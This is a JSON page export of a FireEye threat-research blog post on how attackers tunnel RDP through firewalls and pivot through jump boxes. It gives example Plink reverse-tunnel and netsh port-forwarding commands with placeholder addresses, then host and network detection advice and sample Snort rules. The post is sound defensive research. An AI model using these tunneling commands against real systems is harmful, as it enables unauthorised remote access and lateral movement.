{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Thu Jan 24 2019 10:53:34 GMT-0500",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "Bypassing Network Restrictions Through RDP Tunneling",
    "jcr:versionHistory": "388bff18-2bd8-4f71-8fad-3a22a2debc7e",
    "author": "David Pany",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "06f9c2a5-c318-4cf6-8475-51841777c9f4"
    ],
    "jcr:created": "Tue Oct 22 2019 19:07:37 GMT+0000",
    "cq:lastModified": "Tue Oct 22 2019 19:07:10 GMT+0000",
    "jcr:baseVersion": "06f9c2a5-c318-4cf6-8475-51841777c9f4",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:cap-david-pany",
      "fireeye-blog-authors:cap-steve-miller",
      "fireeye-blog-authors:danielle-desfosses",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:rdp"
    ],
    "jcr:uuid": "e96cca46-522c-428e-9bcd-010f1abdfe9f",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Thu Jan 24 2019 11:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003ERemote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.\u003C\/p\u003E\n\u003Ch4\u003ERDPing Against the Rules\u003C\/h4\u003E\n\u003Cp\u003EThreat actors continue to prefer RDP for the stability and functionality advantages over non-graphical backdoors, which can leave unwanted artifacts on a system. As a result, FireEye has observed threat actors using native Windows RDP utilities to connect laterally across systems in compromised environments. Historically, non-exposed systems protected by a firewall and NAT rules were generally considered not to be vulnerable to inbound RDP attempts; however, threat actors have increasingly started to subvert these enterprise controls with the use of network tunneling and host-based port forwarding.\u003C\/p\u003E\n\u003Cp\u003ENetwork tunneling and port forwarding take advantage of firewall \u0026quot;pinholes\u0026quot; (ports not protected by the firewall that allow an application access to a service on a host in the network protected by the firewall) to establish a connection with a remote server blocked by a firewall. Once a connection has been established to the remote server through the firewall, the connection can be used as a transport mechanism to send or \u0026quot;tunnel\u0026quot; local listening services (located inside the firewall) through the firewall, making them accessible to the remote server (located outside the firewall), as shown in Figure 1.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/RDPtunneling\/Picture1.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Enterprise firewall bypass using RDP and network tunneling with SSH as an example\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EInbound RDP Tunneling\u003C\/h4\u003E\n\u003Cp\u003EA common utility used to tunnel RDP sessions is PuTTY Link, commonly known as Plink. Plink can be used to establish secure shell (SSH) network connections to other systems using arbitrary source and destination ports. Since many IT environments either do not perform protocol inspection or do not block SSH communications outbound from their network, attackers such as FIN8 have used Plink to create encrypted tunnels that allow RDP ports on infected systems to communicate back to the attacker command and control (C2) server.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Ci\u003E\u003Cu\u003EExample Plink Executable Command:\u003C\/u\u003E\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003Eplink.exe\u0026nbsp;\u0026lt;users\u0026gt;@\u0026lt;IP or domain\u0026gt;\u0026nbsp;-pw \u0026lt;password\u0026gt; -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EFigure 2 provides an example of a successful RDP tunnel created using Plink, and Figure 3 provides an example of communications being sent through the tunnel using port forwarding from the attacker C2 server.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/RDPtunneling\/Picture2.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Example of successful RDP tunnel created using Plink\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/RDPtunneling\/Picture3.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Example of successful port forwarding from the attacker C2 server to the victim\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIt should be noted that for an attacker to be able to RDP to a system, they must already have access to the system through other means of compromise in order to create or access the necessary tunneling utility. For example, an attacker\u2019s initial system compromise could have been the result of a payload dropped from a phishing email aimed at establishing a foothold into the environment, while simultaneously extracting credentials to escalate privileges. RDP tunneling into a compromised environment is one of many access methods typically used by attackers to maintain their presence in an environment.\u003C\/p\u003E\n\u003Ch4\u003EJump Box Pivoting\u003C\/h4\u003E\n\u003Cp\u003ENot only is RDP the perfect tool for accessing compromised systems externally, RDP sessions can be daisy chained across multiple systems as a way to move laterally through an environment. FireEye has observed threat actors using the native Windows Network Shell (netsh) command to utilize RDP port forwarding as a way to access newly discovered segmented networks reachable only through an administrative jump box.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Ci\u003E\u003Cu\u003EExample netsh Port Forwarding Command:\u003C\/u\u003E\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003Enetsh interface portproxy add v4tov4 listenport=8001 listenaddress=\u0026lt;JUMP BOX IP\u0026gt; connectport=3389 connectaddress=\u0026lt;DESTINATION IP\u0026gt;\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003E\u003Cu\u003EExample Shortened netsh Port Forwarding Command:\u003C\/u\u003E\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003Enetsh I p a v l=8001 listena=\u0026lt;JUMP BOX IP\u0026gt; connectp=3389 c=\u0026lt;DESTINATION IP\u0026gt;\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EFor example, a threat actor could configure the jump box to listen on an arbitrary port for traffic being sent from a previously compromised system. The traffic would then be forwarded directly through the jump box to any system on the segmented network using any designated port, including the default RDP port TCP 3389. This type of RDP port forwarding gives threat actors a way to utilize a jump box\u2019s allowed network routes without disrupting legitimate administrators who are using the jump box during an ongoing RDP session. Figure 4 provides an example of RDP lateral movement to a segmented network via an administrative jump box.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/RDPtunneling\/Picture4.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Lateral Movement via RDP using a jump box to a segmented network\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EPrevention and Detection of RDP Tunneling\u003C\/h4\u003E\n\u003Cp\u003EIf RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both host-based and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/04\/establishing-a-baseline-for-remote-desktop-protocol.html\u0022\u003Eestablishing a baseline for remote desktop protocol\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003E\u003Cu\u003EHost-Based Prevention:\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003ERemote Desktop Service: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity.\u003C\/li\u003E\n\u003Cli\u003EHost-based Firewalls: Enable host-based firewall rules that explicitly deny inbound RDP connections.\u003C\/li\u003E\n\u003Cli\u003ELocal Accounts: Prevent the use of RDP using local accounts on workstations by enabling the \u201cDeny log on through Remote Desktop Services\u201d security setting.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003EHost-Based Detection:\u003C\/u\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ERegistry Keys:\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EReview registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems:\u003Cul\u003E\n\u003Cli\u003EHKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\u003C\/li\u003E\n\u003Cli\u003EHKEY_CURRENT_USER\\SoftWare\\SimonTatham\\PuTTY\\SshHostKeys\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003ESimilarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key:\u003Cul\u003E\n\u003Cli\u003EHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003ECollecting and reviewing these registry keys can identify both legitimate SSH and unexpected tunneling activity. Additional review may be needed to confirm the purpose of each artifact.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Ci\u003EEvent Logs:\u003C\/i\u003E\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EReview event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems:\u003Cul\u003E\n\u003Cli\u003E%systemroot%\\Windows\\System32\\winevt\\Logs\\Microsoft-TerminalServices-LocalSessionmanager%3Operational.evtx\u003C\/li\u003E\n\u003Cli\u003E%systemroot%\\Windows\\System32\\winevt\\Logs\\Security.evtx\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EThe \u201cTerminalServices-LocalSessionManager\u201d log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The \u201cSecurity\u201d log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 \u2013 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost\u2019s RDP port TCP 3389.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EReview your artifacts of execution for \u201cplink.exe\u201d file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to:\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EApplication Compatibility Cache\/Shimcache\u003C\/li\u003E\n\u003Cli\u003EAmcache\u003C\/li\u003E\n\u003Cli\u003EJump Lists\u003C\/li\u003E\n\u003Cli\u003EPrefetch\u003C\/li\u003E\n\u003Cli\u003EService Events\u003C\/li\u003E\n\u003Cli\u003ECCM Recently Used Apps from the WMI repository\u003C\/li\u003E\n\u003Cli\u003ERegistry keys\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003ENetwork-Based Prevention:\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003ERemote Connectivity: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.\u003C\/li\u003E\n\u003Cli\u003EDomain Accounts: Employ the \u201cDeny log on through Remote Desktop Services\u201d security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003ENetwork-Based Detection:\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul style=\u0022list-style-position: inside;\u0022\u003E\n\u003Cli\u003EFirewall Rules: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed.\u003C\/li\u003E\n\u003Cli\u003ENetwork Traffic: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or 443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic.\u003C\/li\u003E\n\u003Cli\u003ESnort Rules: The main indicator of tunneled RDP occurs when the RDP handshake has a designated low source port generally used for another protocol. Figure 5 provides two sample Snort rules that can help security teams identify RDP tunneling in their network traffic by identifying designated low source ports generally used for other protocols.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ealert tcp any [21,22,23,25,53,80,443,8080] -\u0026gt; any !3389 (msg:\u0026quot;RDP - HANDSHAKE [Tunneled msts]\u0026quot;; dsize:\u0026lt;65; content:\u0026quot;|03 00 00|\u0026quot;; depth:3; content:\u0026quot;|e0|\u0026quot;; distance:2; within:1; content:\u0026quot;Cookie: mstshash=\u0026quot;; distance:5; within:17; sid:1; rev:1;)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ealert tcp any [21,22,23,25,53,80,443,8080] -\u0026gt; any !3389 (msg:\u0026quot;RDP - HANDSHAKE [Tunneled]\u0026quot;; flow:established; content:\u0026quot;|c0 00|Duca\u0026quot;; depth:250; content:\u0026quot;rdpdr\u0026quot;; content:\u0026quot;cliprdr\u0026quot;; sid:2; rev:1;)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Sample Snort Rules to identify RDP tunneling\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003ERDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken to actively monitor for and be able to identify malicious RDP usage.\u003C\/p\u003E\n",
        "jcr:lastModified": "Tue Oct 22 2019 19:07:10 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EWith more threat actors using Remote Desktop Protocol, security teams are being challenged to decipher between legitimate and malicious RDP traffic.\u003C\/p\u003E\n",
      "jcr:lastModified": "Wed Jan 23 2019 13:43:38 GMT-0500",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Wed Jan 23 2019 13:47:39 GMT-0500",
      "imageRotate": "0"
    }
  }
}
